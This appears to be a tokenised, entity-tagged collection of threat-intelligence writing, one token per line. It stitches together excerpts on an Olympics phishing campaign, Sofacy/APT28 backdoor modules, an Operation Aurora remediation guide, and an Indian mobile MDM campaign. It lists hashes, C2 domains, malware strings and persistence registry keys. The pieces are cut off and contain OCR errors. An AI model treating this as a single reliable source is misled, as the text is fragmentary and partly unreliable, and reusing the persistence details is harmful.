quickly
the
adversary
has
adapted
to
new
tools
.

On
December
20
,
the
tool
Invoke
-
PSImage
was
released
to
the
public
and
within
seven
days
was
tested
and
deployed
in
a
campaign
targeting
organizations
involved
in
the
2018
Pyeongchang
Olympics
.

With
the
upcoming
Olympics
,
we
expect
to
see
an
increase
in
cyberattacks
using
Olympics
-
related
themes
.

In
similar
past
cases
,
the
victims
were
targeted
for
their
passwords
and
nancial
information
.

In
this
case
the
adversary
is
targeting
the
organizations
involved
in
the
Winter
Olympics
by
using
several
techniques
to
make
it
more
tempting
to
open
the
weaponized
document
:

Spoofed
email
address
from
South
Korea's
National
Counter
-
Terrorism
Council

Use
of
Korean
language

Asking
users
to
open
the
content
because
the
document
is
in
protected
mode

Partial
use
of
the
original
South
Korean
Ministry
of
Agriculture
and
Forestry
domain
in
a
registered
fake
domain
for
malicious
intent

The
Advanced
Threat
Research
team
has
discovered
an
increase
in
the
use
of
weaponized
Word
documents
against
South
Korean
targets
in
place
of
the
traditional
use
of
weaponized
documents
exploiting
vulnerabilities
in
the
Hangul
word
processor
software
.

Indicators
of
compromise

SHA-1

c388b693d10e2b84af52ab2c29eb9328e47c3c16 B_hash

8ad0a56e3db1e2cd730031bdcae2dbba3f7aba9c B_hash

200.122.181.63 B_ip.unknown

Domains

thlsystems.for rst.cz B_url.normal

mafra.go.kr.jeojang.ga B_url.normal

Previous
Article
(
https://securingtomorrow.mcafee.com/consumer/family-safety/2018-resolution-lose-weight-techsafety-guilt/ B_url.normal
)

Next
Article
(
https://securingtomorrow.mcafee.com/consumer/mcafee-ces-solutions-partnerships/ B_url.normal
)

Categories
:
McAfee
Labs
(
https://securingtomorrow.mcafee.com/category/mcafee-labs/ B_url.normal
)

Tags
:
cybersecurity
(
https://securingtomorrow.mcafee.com/tag/cybersecurity/ B_url.normal
)
,
endpoint
protection
(
https://securingtomorrow.mcafee.com/tag/endpoint-protection/
)
,
malware
(
https://securingtomorrow.mcafee.com/tag/malware/ B_url.normal
)

Sort
by

Oldest

Leave
a
reply

Facebook
Comments
(
0
)
Comments
(
0
)
G+
Comments
0
Comments

Add
a
comment
...

Facebook
Comments
Plugin

Newsletter
Sign
Up

First
Name

Last
name
2018
Sofacy
Activity

By
GReAT
on
March
9
,
2018
.
5:00
pm

Sofacy
,
also
known
as
APT28
,
Fancy
Bear
,
and
Tsar
Team
,
is
a
prolific
,
well
resourced
,
and
persistent
adversary
.

They
are
sometimes
portrayed
as
wild
and
reckless
,
but
as
seen
under
our
visibility
,
the
group
can
be
pragmatic
,
measured
,
and
agile
.

Our
previous
post
on
their
2017
activity
stepped
away
from
the
previously
covered
headline
buzz
presenting
their
association
with
previously
known
political
hacks
and
interest
in
Europe
and
the
US
,
and
examines
their
under-reported
ongoing
activity
in
middle
east
,
central
asia
,
and
now
a
shift
in
targeting
further
east
,
including
China
,
along
with
an
overlap
surprise
.

There
is
much
understated
activity
that
can
be
clustered
within
this
set
and
overlap
in
APT
activity
.

Here
,
we
examine
current
deployment
,
code
,
cryptography
,
and
targeting
.

Essentially
,
this
examination
finds
the
group
maintains
subdivisions
of
efforts
in
targeting
,
development
,
and
coding
.

Comparisons
to
other
modules
quickly
shows
a
delineation
in
other
Sofacy
efforts
.

SPLM B_malware.backdoor
,
GAMEFISH
,
and
Zebrocy
delivery
all
maintain
their
own
clusters
,
but
frequently
overlap
later
.

Because
SPLM B_malware.backdoor
is
their
primary
and
selective
second
stage
tool
,
SPLM B_malware.backdoor
deployment
is
of
much
interest
.

But
Zebrocy
efforts
are
in
such
high
volume
,
that
these
modules
need
examination
as
well
.

SPLM B_malware.backdoor
/
CHOPSTICK B_malware.backdoor
/
XAgent B_malware.backdoor
Code

SPLM B_malware.backdoor
,
otherwise
known
as
CHOPSTICK B_malware.backdoor
,
or
by
the
author
(
s
)
as
'
XAgent B_malware.backdoor
'
,
is
described
as
Sofacy's
signature
second
stage
tool
,
selectively
used
for
years
against
around
the
world
.

Really
,
many
modified
XAgent B_malware.backdoor
modules
have
been
deployed
over
the
years
.

Even
the
individual
Linux
modules
renamed
as
'
Fysbis
'
backdoors
released
in
2016
were
merely
modified
and
reduced
portions
of
recompiled
XAgent B_malware.backdoor
C/C++
codebase
.

Anyway
,
SPLM B_malware.backdoor
/
CHOPSTICK B_malware.backdoor
has
maintained
various
combinations
of
code
,
with
some
recognizable
functionality
listed
here
.

Source

Modules

Channels

Boot

Library

Modules

Keylogger

RemoteShell

FileSystem

Launcher

Channels

HTTP

SMTP

MainHandler

CameraShot

InjectApp

Screenshot

FileObserver

PasswordFirefox

InfoOS

Version
3
and
early
version
4
SPLM B_malware.backdoor
modules
maintained
keylogger
,
remoteshell
,
and
filestealer
code
all
within
the
larger
compiled
backdoor
,
and
executed
each
body
of
functionality
from
within
that
process
memory
space
.

Later
v4
SPLM B_malware.backdoor
injected
individual
keylogger
,
filestealer
,
and
remoteshell
modules
into
memory
space
.

But
for
the
most
part
,
deployed
SPLM B_malware.backdoor
maintained
the
structure
of
earlier
executable
code
.

In
2018
,
we
now
see
them
pushing
individual
and
separate
blobs
of
keylogger
,
filesystem
,
and
remoteshell
code
that
never
touch
disk
.

The
larger
,
300kb+
SPLM B_malware.backdoor
backdoors
deployed
in
2016
and
2017
are
not
observed
any
longer
at
targets
in
2018
.

Instead
,
in-memory
modules
appear
in
isolation
.

In
addition
to
purely
XAgent B_malware.backdoor
based
code
,
we
also
observe
zebrocy
modules
completely
recoded
into
powershell
from
.Net
.

Code
and
Crypto
Comparisons

Current
SPLM B_malware.backdoor
code
maintains
the
unusual
cipher
hack
that
Sofacy
began
deploying
in
2017
to
hide
away
configuration
details
.

Comparisons
with
cipher
design
and
implementations
we
see
in
WhiteBear
,
earlier
SPLM B_malware.backdoor
and
Zebrocy
modules
tell
a
few
things
about
design
decisions
and
culture
.

And
when
specific
malware
sets
are
selectively
deployed
,
that
may
tell
us
something
about
how
efforts
are
divided
.

SPLM B_malware.backdoor
full
backdoor
and
plugins
crypto
and
strings
v4
973ff7eb7a5b720c5f6aafe4cd0469d5

Summary
:
SPLM B_malware.backdoor
is
being
carved
up
and
delivered
as
memory
-
only
chunks
of
compiled
code
.

We
observe
the
'
retranslator
'
code
,
or
ProcessRetranslator.dll
,
currently
being
delivered
to
systems
without
the
presence
of
the
previous
,
large
,
SPLM B_malware.backdoor
code
and
injection
capabilities
.

The
smaller
plugins
deployed
in
2018
now
maintain
the
same
dynamic
encryption
code
as
the
large
330kb
full
SPLM B_malware.backdoor
backdoors
seen
in
more
widespread
use
in
2017
.

Strings
are
well
organized
and
concise
.

Code
and
strings
example
(
decrypted
from
2018
'
ProcessRetranslator.dll
'
plugin
)
:

success
command
not
correct

error
save
parameters

error
set
parameters
for
channel
,
see
full
info

command
processing
error

not
correct
command

command
loading
func
/
net
module
error

command
unloading
func
/
net
module
error

cmd.exe

Retranslator
is
now
launched

Retranslator
is
now
stopped

the
process
is
destroyed

one
thread
has
died
so
the
process
is
killed
too

create
process
failed
on
:
(
%s
)
,
error
(
%d
)

Retranslator
is
already
running

Retranslator
is
not
running

exit

command
is
successful

command
is
unsuccessful

SPLM B_malware.backdoor
crypto
v3
(
DNC
hack
)
cc9e6578a47182a941a478b276320e06

Summary
:
This
earlier
SPLM B_malware.backdoor
variant
found
on
the
DNC
network
in
2016
still
maintains
the
internal
name
'
splm.dll
'
,
with
only
one
export
'
init
'
that
was
called
at
runtime
.


The
C++
structure
of
this
280kb+
dll
is
familiar
SPLM B_malware.backdoor
/
CHOPSTICK B_malware.backdoor
,
but
it
maintains
a
completely
different
cipher
for
decrypting
configuration
data
and
error
messages
,
etc
.

The
loop
performing
the
bulk
of
the
work
is
less
than
100
bytes
,
performing
pointer
arithmetic
alongside
a
couple
xor
operations
of
a
lower
nibble
against
sequential
bytes
.

Here
,
the
cipher
uses
a
modolo
pointer
arithmetic
along
with
a
decryption
key
per
blob
.

Reviewing
all
the
older
ciphers
and
newer
EC
based
ciphers
in
openssl
and
elsewhere
results
in
no
match
.

WhiteBear
code
and
strings

Summary
:
WhiteBear
is
a
cluster
of
activity
targeting
foreign
embassies
and
MFA
organizations
,
starting
in
early
2016
and
continued
into
early
2017
.

Our
private
GReAT
report
on
this
activity
pushed
in
February
2017
,
and
a
public
report
from
another
vendor
described
much
of
the
same
content
almost
seven
months
later
as
'
Gayzer
'
.

It
appeared
to
be
a
parallel
project
to
WhiteAtlas
Turla
,
and
maintained
quirks
like
modular
,
well
logged
code
with
an
elegant
,
professional
RSA
and
3DES
encryption
implementation
and
high
quality
code
injection
capabilities
,
but
lots
of
immature
and
crude
language
and
english
mistakes
.

Clearly
,
english
and
maturity
was
not
the
developers
'
native
language
.

While
WhiteBear
is
Turla
related
,
it
is
interesting
to
compare
to
other
ongoing
development
styles
.

Strings
and
code
are
crass
.

Debug
and
command
strings

i
cunt
waiting
anymore
#%d

lights
aint
turnt
off
with
#%d

Not
find
process

CMessageProcessingSystem::Receive_NO_CONNECT_TO
_GAYZER

CMessageProcessingSystem::Receive_TAKE_LAST_CONN
ECTION

CMessageProcessingSystem::Send_TAKE_FIN

Zebrocy
custom
crypto

Summary
:
innovative
.Net
,
AutoIT
,
Delphi
,
and
powershell
components
are
continually
updated
and
deployed
to
new
and
old
targets
.

Cryptography
ranges
from
built-in
windows
api
to
custom
RC4-based
ciphers
.

Strings
and
code
are
simple
,
innovative
,
and
concise
.

Code
:

Targeting
Overlap
and
a
Pivot
to
Asia

News
headlines
repeatedly
trumpet
Sofacy's
foray
into
Western
targets
in
the
US
and
Europe
,
especially
those
connected
with
NATO
.

But
these
efforts
only
tell
a
portion
of
the
Sofacy
story
.

Delineating
groups
and
activity
can
be
messy
,
and
there
appears
to
be
overlap
in
targeting
efforts
across
varying
groups
in
central
and
east
asia
throughout
2017
and
into
2018
.

Sofacy
has
been
heavily
interested
in
military
and
foreign
affairs
organizations
here
,
resulting
in
multiple
overlapped
and
competing
targeting
scenarios
:

Mosquito
Turla
and
Zebrocy
clusters
–
Zebrocy
clusters
targeting
diplomatic
and
commercial
organizations
within
Europe
and
Asia
that
match
Mosquito
targeting
profiling

SPLM B_malware.backdoor
overlap
with
traditional
Turla
–
often
Turla
precedes
SPLM B_malware.backdoor
deployments

SPLM B_malware.backdoor
overlap
with
Zebrocy
–
Zebrocy
often
precedes
SPLM B_malware.backdoor
deployments

SPLM B_malware.backdoor
overlap
with
Danti

Currently
,
Sofacy
targets
large
air-defense
related
commercial
organizations
in
China
with
SPLM B_malware.backdoor
,
and
moves
Zebrocy
focus
across
Armenia
,
Turkey
,
Kazahkstan
,
Tajikistan
,
Afghanistan
,
Mongolia
,
China
,
and
Japan
.

A
previous
,
removed
,
report
from
another
vendor
claimed
nonspecific
information
about
the
groups
'
interest
in
Chinese
universities
,
but
that
report
has
been
removed
–
most
likely
detections
were
related
to
students
'
and
researchers
'
scanning
known
collected
samples
and
any
'
incidents
'
remain
unconfirmed
and
unknown
.

On
the
other
hand
,
this
Chinese
conglomerate
designs
and
manufactures
aerospace
and
air
defense
technologies
,
among
many
other
enterprises
.

And
here
,
an
interest
in
military
technologies
is
certainly
within
Sofacy
purview
.

So
,
even
more
interesting
than
the
shift
eastward
and
other
targeting
overlap
,
is
that
the
specific
target
system
in
China
was
previously
a
Grey
Lambert
target
.

The
Sofacy
modules
at
this
system
appeared
to
never
touch
disk
,
and
resemble
the
Linux
Fysbis
code
.

Only
one
maintained
the
Filesystem.dll
code
,
while
another
maintained
ProcessRetranslator.dll
code
.

However
,
it
is
unusual
that
a
full
SPLM B_malware.backdoor
backdoor
was
not
detected
on
this
system
,
nor
was
any
powershell
loader
script
.

Because
the
injection
source
remains
unidentified
on
such
a
unique
system
,
we
might
speculate
on
what
is
going
on
here
:

1
.
Sofacy
attackers
had
recorded
a
previous
Grey
Lambert
remote
session
and
replayed
the
communication
after
discovering
this
host
,
essentially
compromising
the
Grey
Lambert
module
on
the
system
to
gain
access
and
later
injecting
SPLM B_malware.backdoor
modules

2
.
Grey
Lambert
attackers
inserted
false
flag
and
reduced
SPLM B_malware.backdoor
modules

3
.
a
new
and
unrecognized
,
full
variant
of
SPLM B_malware.backdoor
attempted
to
inject
module
code
into
memory
and
deleted
itself

4
.
an
unknown
new
powershell
script
or
legitimate
but
vulnerable
web
app
was
exploited
to
load
and
execute
this
unusual
SPLM B_malware.backdoor
code

In
all
likelihood
,
the
last
option
is
accurate
.

Conclusion

Sofacy
is
such
a
large
,
active
group
that
appears
to
maintain
multiple
subgroups
and
efforts
that
all
fit
under
the
Sofacy
'
umbrella
'
.

Sometimes
,
they
share
infrastructure
,
but
more
often
they
do
not
share
infrastructure
and
appear
to
compete
for
access
within
targets
.

Either
way
,
the
group's
consistent
activity
throughout
central
and
eastern
asia
seems
to
be
poorly
represented
in
the
public
discussion
.

SPLM B_malware.backdoor
did
not
change
in
substantial
ways
for
several
years
,
and
now
it
is
being
split
up
and
used
for
just
functional
modules
.

And
much
of
the
malware
being
deployed
by
Sofacy
is
quickly
changed
from
C/C++
to
.Net
to
powershell
.

Other
open
source
and
semi-legitimate
pen-testing
tools
like
nbtscan
and
powercat
are
being
used
for
mapping
available
resources
and
lateral
movement
as
well
.

It
is
easy
to
expect
deliberate
changes
within
this
group
in
2018
,
with
even
more
.Net
,
Delphi
,
and
powershell
ports
of
various
tools
appearing
at
Sofacy
targets
throughout
the
year
.

Technical
Appendix

Early
2018
Reference
Set

SPLM B_malware.backdoor

452ed4c80c1d20d111a1dbbd99d649d5 B_hash

ZEBROCY

efd8a516820c44ddbf4cc8ed7f30df9c B_hash

ff0e4f31a6b18b676b9518d4a748fed1 B_hash

GAMEFISH

bd3e9f7e65e18bb9a7c4ff8a8aa3a784 B_hash

GREY
LAMBERT

86146d38b738d5bfaff7e85a23dcc53e B_hash

GREYWARE
/
PEN-TESTING
NBTSCAN

f01a9a2d1e31332ed36c1a4d2839f412 B_hash

APT

APT
CRIMINAL

SOFACY

TARGETED
ATTACK

Share
post
on
:

Related
Posts

The
Slingshot
APT
FAQ

The
devil's
in
the
Rich
header

OlympicDestroyer
is
here
to
trick
the
industry
McAfee
Labs
:

Combating
Aurora B_malware.infosteal

By
Rohit
Varma
,
McAfee
LabsTM

Contents

Overview
.............................................................................................................................
2

McAfee
detection
names
for
Aurora B_malware.infosteal
...................................................................................
3

Exploit-Comele
...........................................................................................................
3

Roarur.dr
.....................................................................................................................
3

Roarur.dll
....................................................................................................................
3

Symptoms
...........................................................................................................................
5

Characteristics
.....................................................................................................................
5

Common
filenames
and
hashes
...........................................................................................
6

McAfee
product
coverage
for
Aurora B_malware.infosteal
.................................................................................
7

Common
URLs
accessed
.
.................................................................................................
10

Appendix B_url.unknown
A I
:
Useful
URLs
related
to
Aurora B_malware.infosteal
...................................................................
11

Overview

Combating
Aurora B_malware.infosteal
'
Operation
Aurora B_malware.infosteal
,
'
released
the
week
of
January
11
,
exploits
the
recent
Microsoft
Internet
Explorer
vulnerability
.

The
attack
was
initially
targeted
at
several
large
companies
,
including
Google
.

It
is
now
public
and
is
available
on
the
web
.

The
public
release
significantly
increases
the
possibility
of
widespread
attacks
exploiting
the
vulnerability
,
putting
Internet
Explorer
users
at
potentially
serious
risk
.

Microsoft
is
aware
of
the
targeted
attacks
and
lists
the
following
combinations
as
vulnerable
:
Internet
Explorer
6
Service
Pack
1
on
Microsoft
Windows
2000
Service
Pack
4
,
and
Internet
Explorer
6
,
Internet
Explorer
7
and
Internet
Explorer
8
on
supported
editions
of
Windows
XP
,
Windows
Server
2003
,
Windows
Vista
,
Windows
Server
2008
,
Windows
7
,
and
Windows
Server
2008
R2
.
http://www.microsoft.com/technet/security/advisory/979352.mspx B_url.unknown

Below
we
have
a
summary
of
McAfee's
assessment
of
Internet
Explorer
and
platform
risks
:

*
DEP

Data
Execution
Prevention
(
DEP
)
is
a
set
of
hardware
and
software
technologies
that
perform
additional
checks
on
memory
to
help
prevent
malicious
code
from
running
on
a
system
.

In
Microsoft
Windows
XP
Service
Pack
2
(
SP2
)
and
Microsoft
Windows
XP
Tablet
PC
Edition
2005
,
DEP
is
enforced
by
hardware
and
by
software
.

The
primary
benefit
of
DEP
is
to
help
prevent
code
execution
from
data
pages
.

Typically
,
code
is
not
executed
from
the
default
heap
and
the
stack
.

Hardwareenforced
DEP
detects
code
that
is
running
from
these
locations
and
raises
an
exception
when
execution
occurs
.

Software
-
enforced
DEP
can
help
prevent
malicious
code
from
taking
advantage
of
exception
-
handling
mechanisms
in
Windows
.

McAfee
detection
names
for
Aurora B_malware.infosteal

Exploit
-
Comele

This
maliciously
crafted
script
attempts
to
exploit
the
vulnerability
when
Internet
Explorer
handles
certain
DOM
operations
.

An
attacker
may
exploit
this
issue
to
execute
remote
code
.

http://vil.nai.com/vil/content/v_253210.htm B_url.unknown

Roarur.dr

This
Trojan
drops
further
malicious
files
onto
the
victim's
computer
.
http://vil.nai.com/vil/content/v_253415.htm B_url.unknown

Roarur.dll

This
Trojan
is
dropped
by
the
roarur.dr
Trojan
.

The
dll
creates
an
additional
service
on
the
victim's
computer
and
checks
for
certain
files
on
the
system
.

The
files
it
looks
for
are

•
acelpvc.dll
(
presence
of
this
file
does
not
necessarily
imply
an
infection
)
.

acelpvc.dll
is
used
to
stream
live
desktop
feeds
to
the
attacker

•
VedioDriver.dll
(
presence
of
this
file
does
not
necessarily
imply
an
infection
)-
Helper
dll
for
acelpvc.dll

http://vil.nai.com/vil/content/v_253416.htm B_url.unknown

Aliases

Trojan.Hydraq

Symptoms

Outbound
network
connections
to
'
hxxp://demo[remove].jpg B_url.unknown
'

The
presence
of
the
following
files
:

%SystemDir%\Rasmon.dll

%SYSDIR%\DFS.bat

The
presence
of
the
following
registry
keys
:

•
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RaS[%
random
4
chars
%]
'
ImagePath
'
=
%SystemRoot%\svchost.exe
-k
netsvcs

•
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RaS[%
random
4
chars
%]
'
Start'=
02
,
00
,
00
,
00

•
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RaS[%
random
4
chars
%]\Parameters
'
ServiceDll
'
=
%SystemRoot%\rasmon.dll

Characteristics

Aurora B_malware.infosteal
demonstrates
these
four
infection
characteristics
:

Common
filenames
and
hashes

securmon.dll
:

E3798C71D25816611A4CAB031AE3C27A B_hash

Rasmon.dll
:

0F9C5408335833E72FE73E6166B5A01B B_hash

a.exe
:

CD36A3071A315C3BE6AC3366D80BB59C B_hash

b.exe

9F880AC607CBD7CDFFFA609C5883C708 B_hash

AppMgmt.dll

6A89FBE7B0D526E3D97B0DA8418BF851 B_hash

A0029670.dll

3A33013A47C5DD8D1B92A4CFDCDA3765 B_hash

msconfig32.sys

7A62295F70642FEDF0D5A5637FEB7986 B_hash

VedioDriver.dll

467EEF090DEB3517F05A48310FCFD4EE B_hash

acelpvc.dll

4A47404FC21FFF4A1BC492F9CD23139C B_hash

wuauclt.exe

69BAF3C6D3A8D41B789526BA72C79C2D B_hash

jucheck.exe

79ABBA920201031147566F5418E45F34 B_hash

AdobeUpdateManager.exe

9A7FCEE7FF6035B141390204613209DA B_hash

zf32.dll

EB4ECA9943DA94E09D22134EA20DC602 B_hash

*
This
data
is
subject
to
change
.

*
For
the
latest
data
,
please
visit
McAfee
Aurora B_malware.infosteal
site

http://www.mcafee.com/us/threat_center/operation_aurora.html B_url.unknown

McAfee
product
coverage
for
Aurora B_malware.infosteal

The
McAfee
Labs
Aurora B_malware.infosteal
Stinger
tool

The
Aurora B_malware.infosteal
Stinger
tool
detects
and
removes
threats
associated
with
'
Operation
Aurora B_malware.infosteal
'
attacks
.

http://download.nai.com/products/mcafee-avert/aurora_stinger.exe B_url.unknown

Extended
McAfee
product
coverage
details
:

McAfee
Web
Gateway
.

TrustedSource
has
coverage
for
domains
and
IP
addresses
that
the
malware
contacts
.

Coverage
for
associated
malware
was
released
January
15
(
as
'
BehavesLike.JS.Obfuscated.E
'
)
.

Proactive
coverage
existed
for
some
components
(
as
'
Trojan.Crypt.XDR.Gen
'
)
.

McAfee
Application
Control
.

All
versions
of
McAfee
Application
Control
protect
against
infection
,
without
requiring
updates
,
and
will
prevent
all
versions
of
the
Aurora B_malware.infosteal
attack
witnessed
to
date
.

McAfee
Firewall
Enterprise
.

TrustedSource
has
coverage
for
domains
and
IP
addresses
that
the
malware
contacts
.

The
embedded
McAfee
anti
-
virus
scanning
engine
in
Firewall
Enterprise
Version
7.0.1.02
and
later
provides
coverage
for
supported
protocols
via
standard
McAfee
DAT
updates
.
Coverage
for
known
exploits
and
associated
malware
is
provided
as
Exploit
-
Comele
,
Roarur.dr
,
and
Roarur.dll
in
the
5862
DATs
,
released
January
15
.

McAfee
SiteAdvisor
,
SiteAdvisor
Plus
,
SiteAdvisor
Enterprise
.

TrustedSource
has
coverage
for
domains
and
IP
addresses
that
the
malware
contacts
.

McAfee
Email
and
Web
Security
Appliances
.

TrustedSource
has
coverage
for
domains
and
IP
addresses
that
the
malware
contacts
.

Aurora B_malware.infosteal
coverage
in
McAfee
point
products
:

Exploit-Comele
Trojan

DAT
files

VSE
BOP

Host
IPS

Coverage
is
provided
as
Exploit-Comele
in
the
5860
DATs
,
released
January
13
,
for
known
exploits
.

Out
of
scope

Out
of
scope

McAfee
Network
Security

Platform

The
UDS
release
of
January
14
contains
the
signature
'
UDS-HTTP
:
Microsoft
Internet
Explorer
HTML
DOM
Memory
Corruption
,
'
which
provides
coverage
.

McAfee
Vulnerability
Manager

Coverage
not
warranted
at
this
time

MNAC
2.x

Coverage
not
warranted
at
this
time

McAfee
Remediation
Manager

Malware
coverage
is
out
of
scope
.

McAfee
Policy
Auditor
SCAP

Out
of
scope

MNAC
SCAP

Out
of
scope

Roarur.dr
Trojan

DAT
files

VSE
BOP

Host
IPS

Coverage
is
provided
as
Roarur.dr
in
the
5862
DATS
,
released
January
15
.

Out
of
scope

Out
of
scope

McAfee
Network
Security
Platform

McAfee
Network
Security
Platform
versions
with
Artemis
enabled
(
6.0.x
)
provide
coverage
for
this
malware
.

Out
of
scope
for
prior
versions
.

McAfee
Vulnerability
Manager

Coverage
not
warranted

MNAC
2.x

Coverage
not
warranted

McAfee
Remediation
Manager

Malware
coverage
is
out
of
scope
.

McAfee
Policy
Auditor
SCAP

Out
of
scope

MNAC
SCAP

Out
of
scope

Roarur.dll
Trojan

DAT
files

VSE
BOP

Host
IPS

Coverage
is
provided
as
Roarur.dll
in
the
5862
DATs
,
released
January
15
.

Out
of
scope

Out
of
scope

McAfee
Network
Security
Platform

McAfee
Network
Security
Platform
versions
with
Artemis
enabled
(
6.0.x
)
provide
coverage
for
this
malware
.

Out
of
scope
for
prior
versions
.

McAfee
Vulnerability
Manager

The
FSL
/
MVM
package
of
January
15
includes
a
vulnerability
check
to
assess
if
your
systems
are
at
risk
.

MNAC
2.x

McAfee
Remediation
Manager

The
MNAC
release
of
February
10
will
include
a
vulnerability
check
to
assess
if
your
systems
are
at
risk
.

Malware
coverage
is
out
of
scope
.

McAfee
Policy
Auditor
SCAP

Out
of
scope

MNAC
SCAP

Out
of
scope

Microsoft
Internet
Explorer
DOM
Operation
Memory
Corruption
Vulnerability

Threat
Identifier
(
s
)

CVE-2010-0249

Threat
Type

Vulnerability

Risk
Assessment

High

Main
Threat
Vectors

E-Mail;
Web

User
Interaction
Required

Description

A
memory
corruption
vulnerability
in
some
versions
of
Microsoft
Internet
Explorer
may
lead
to
remote
code
execution
or
an
application
crash
.

The
flaw
lies
in
Internet
Explorer's
handling
of
certain
DOM
operations
.

Exploitation
can
occur
via
a
maliciously
crafted
file
or
a
maliciously
crafted
web
page
and
allow
an
attacker
to
execute
arbitrary
code
.

Failed
exploit
attempts
may
result
in
an
application
crash
(
denial
of
service
)
.

Importance

High
.

On
January
14
Microsoft
publicly
disclosed
this
vulnerability
.

Active
exploitation
has
been
observed
in
the
wild
.

McAfee
Product
Coverage
*

DAT
files

VSE
BOP

Host
IPS

McAfee
Network
Security

Platform

Coverage
for
known
exploits
and
associated
malware
is
provided
as
Exploit
-
Comele
,
Roarur.dr
,
and
Roarur.dll
in
the
5862
DATs
,
released
January
15
.

Generic
buffer
overflow
protection
is
expected
to
cover
some
,
but
not
all
,
exploits
.

Generic
buffer
overflow
protection
is
expected
to
cover
some
,
but
not
all
,
exploits
.

Extended
coverage
is
provided
in
the
January
18
UDS
release
via
the
signature
'
Microsoft
Internet
Explorer
HTML
DOM
Memory
Corruption
III
.
'
Coverage
was
originally
provided
in
the
UDS
release
of
January
14
.

McAfee
Vulnerability
Manager

The
FSL
/
MVM
package
of
January
14
includes
a
vulnerability
check
to
assess
if
your
systems
are
at
risk
.

MNAC
2.x

Under
analysis

McAfee
Remediation
Manager

Remediation
Manager
provides
mitigation
for
this
issue
by
elevating
Internet
Explorer
settings
in
the
Internet
and
Local
Intranet
zones
.

A
remedy
for
this
issue
will
be
provided
upon
release
of
an
official
vendor
patch
.

Cleaning
and
Repair

A
full
on-demand
scan
must
run
to
completely
clean
an
infected
host
.

In
some
cases
,
it
may
also
be
necessary
to
run
the
on-demand
scan
in
Safe
Mode
,
as
well
as
run
a
second
scan
after
a
reboot
.

It
is
critical
that
the
on-demand
scan
be
configured
properly
.

The
proper
configuration
:

•
Scan
All
Local
Drives

•
Memory
for
Rootkits

•
Running
Processes

•
Registry

•
First
'
Action
'
set
to
'
Clean
'

The
full
,
recommended
process
:

•
Launch
a
full
on-demand
scan
with
the
prior
-
documented
configuration

•
Allow
the
scan
to
run
to
completion

•
Reboot

•
Launch
a
second
on-demand
scan
and
allow
it
to
run
to
completion
to
verify
that
the
system
has
been
cleaned

Common
URLs
accessed

The
following
domains
need
to
be
blocked
at
the
firewall
:

360.homeunix.com B_url.unknown

69.164.192.4 B_ip.unknown

alt1.homelinux.com B_url.unknown

amt1.homelinux.com B_url.unknown

aop1.homelinux.com B_url.unknown

app1.homelinux.com B_url.unknown

blogspot.blogsite.org B_url.unknown

filoups.info B_url.unknown

ftp2.homeunix.com B_url.unknown

ftpaccess.cc B_url.unknown

google.homeunix.com B_url.unknown

members.linode.com B_url.unknown

sl1.homelinux.org B_url.unknown

sl1.homelinux.org B_url.unknown

tyuqwer.dyndns.org B_url.unknown

update.ourhobby.com B_url.unknown

voanews.ath.cx B_url.unknown

webswan.33iqst.com:4000 B_url.unknown

yahoo.8866.org B_url.unknown

ymail.ath.cx B_url.unknown

yahooo.8866.org B_url.unknown

sl1.homelinux.org B_url.unknown

360.homeunix.com B_url.unknown

ftp2.homeunix.com B_url.unknown

update.ourhobby.com B_url.unknown

connectproxy.3322.org B_url.unknown

csport.2288.org B_url.unknown

*
This
data
is
subject
to
change
.

*
For
the
latest
data
,
please
visit
McAfee
Aurora B_malware.infosteal
site

http://www.mcafee.com/us/threat_center/operation_aurora.html B_url.unknown

Appendix
A
:
Useful
URLs
related
to
Aurora B_malware.infosteal

http://www.mcafee.com/us/local_content/reports/how_can_u_tell.pdf B_url.unknown

http://www.mcafee.com/us/threat_center/aurora_enterprise.html B_url.unknown

http://newsroom.mcafee.com/article_display.cfm?article_id=3613 B_url.unknown

http://www.mcafee.com/us/threat_center/operation_aurora.html B_url.unknown

http://www.avertlabs.com/research/blog/ B_url.unknown

http://www.microsoft.com/technet/security/advisory/979352.mspx B_url.unknown

http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0249 B_url.unknown

http://podcasts.mcafee.com/audioparasitics/AudioParasitics-Episode80-01-2010.mp3 B_url.unknown

http://community.mcafee.com/groups/operation-aurora B_url.unknown
Software

Vulnerability

Information

Reputation

Center

Library

Support

Communities

About

Careers

Blog

THURSDAY
,
JULY
12
,
2018

Advanced
Mobile
Malware
Campaign
in
India
uses
Malicious
MDM B_malware.infosteal

This
blog
post
is
authored
by
Warren
Mercer
and
Paul
Rascagneres
and
Andrew
Williams
.

SUMMARY

Cisco
Talos
has
identified
a
highly
targeted
campaign
against
13
iPhones
which
appears
to
be
focused
on
India
.

The
attacker
deployed
an
open-source
mobile
device
management
(
MDM B_malware.infosteal
)
system
to
control
enrolled
devices
.

At
this
time
,
we
don't
know
how
the
attacker
managed
to
enroll
the
targeted
devices
.

Enrollment
could
be
done
through
physical
access
to
the
devices
,
or
most
likely
by
using
social
engineering
to
entice
a
user
to
register
.

In
social
engineering
attacks
the
victim
is
tricked
into
clicking
accept
or
giving
the
attacker
physical
access
to
a
device
.

This
campaign
is
of
note
since
the
malware
goes
to
great
lengths
to
replace
specific
mobile
apps
for
data
interception
.

Talos
has
worked
closely
with
Apple
on
countering
this
threat
.

Apple
had
already
actioned
3
certificates
associated
with
this
actor
when
Talos
reached
out
,
and
quickly
moved
to
action
the
two
others
once
Talos
tied
them
to
the
threat
.

An
MDM B_malware.infosteal
is
designed
to
deploy
applications
on
enrolled
devices
.

In
this
campaign
we
identified
five
applications
that
have
been
distributed
by
this
system
to
the
13
targeted
devices
in
India
.

Two
of
them
appear
to
test
the
functionality
of
the
device
,
one
steals
SMS
message
contents
,
and
the
remaining
two
report
the
location
of
the
device
and
can
exfiltrate
various
data
.

Convert
webpages
to
pdf
online
with
PDFmyURL

Search
Blog

SUBSCRIBE
TO
OUR
FEED

Posts

Comments

Subscribe
via
Email

BLOG
ARCHIVE

▼
2018
(
102
)

▼
JULY
(
9
)

Beers
with
Talos
EP33
-
Change
the
Conversation
or
...

Threat
Roundup
for
July
6-13

Advanced
Mobile
Malware

Campaign
in
India
uses
Mal
...

Vulnerability
Spotlight
:

Computerinsel
Photoline
M
...

Vulnerability
Spotlight
:
Multiple

Antenna
House
Vu
...

Microsoft
Patch
Tuesday
-
July
2018

Vulnerability
Spotlight
:
Multiple

The
